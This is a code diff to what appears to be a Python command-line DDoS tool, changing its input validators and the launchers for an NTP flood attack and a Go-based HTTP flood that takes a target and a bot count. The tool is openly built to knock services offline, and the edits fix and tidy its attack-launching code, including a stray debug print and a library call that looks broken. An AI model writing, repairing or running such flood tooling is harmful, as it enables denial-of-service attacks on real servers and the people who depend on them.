@@ -34,7 +34,7 @@ import logging
 import urllib.request
 import random
 import six
-
+import ipaddress
 try:
     from PyInquirer import (Token, ValidationError, Validator, print_json, prompt,
                             style_from_dict)
@@ -115,7 +115,6 @@ class PortValidator(Validator):
     """
     Validates wheather or not its a valid port number
     """
-
     def validate(self, value):
         if value == 80 or value == 443:
             return True
@@ -136,16 +135,12 @@ class IpValidator(Validator):
     """
     Validator for IP input
     """
-
     def validate(self, value):
-        a = value.split('.')
-        for x in a:
-            if not x.isdigit():
-                return False
-            i = int(x)
-            if i < 0 or i > 255:
-                return False
+        try:
+            ipaddress.ip_address(value)
             return True
+        except ValueError:
+            return False
 
 
 class PathValidator(Validator):
@@ -388,7 +383,7 @@ class NtpFloodAttack:
     @classmethod
     def run(cls):
         try:
-            ntpL4.floodNTP(cls.conf.get("thrdz") ,cls.conf.get("target"))
+            ntpL4.floodNTP(int(cls.conf.get("thrdz")) ,cls.conf.get("target"))
         except KeyboardInterrupt:
             log("Stopping ...", color="red")
 
@@ -397,7 +392,8 @@ class HttpGoFood:
     """
     The golang httpFlood attack lunch
     """
-    gofile = "main.so"
+    gofile = "httpflood.so"
+    lib_name = "mainer"
 
     def __init__(self):
         self.target = ""
@@ -426,16 +422,19 @@ class HttpGoFood:
         try:
             file = pathlib.Path(gofile)
             if file.exists():
-                lib = cdll.LoadLibrary("./main.so")
-                lib.mainer(self.target, self.numberOfBots)
+                dir_path = os.path.dirname(os.path.realpath(__file__))
+                lib = cdll.LoadLibrary(os.path.join(dir_path, "httpflood.so"))
+                #lib = cdll.LoadLibrary('./httpflood.so')
+                print("here")
+                lib(self.target, self.numberOfBots)
             else:
                 raise FileNotFoundError
         except BrokenGoFile:
-            log("something went wrong with the gointerpreter", color="red")
+            log("something went wrong with the Go interpreter", color="red")
         except FileNotFoundError:
             log("Did You make the project ? Go executable not found!", color="red")
-        except:
-            log("something went wrong with the gointerpreter 222 ", color="red")
+        except NameError:
+            log("Go object shared library not found, Did You make the project ? ", color="red")
 
 
 def log(string, color="blue", font="slant", figlet=False):
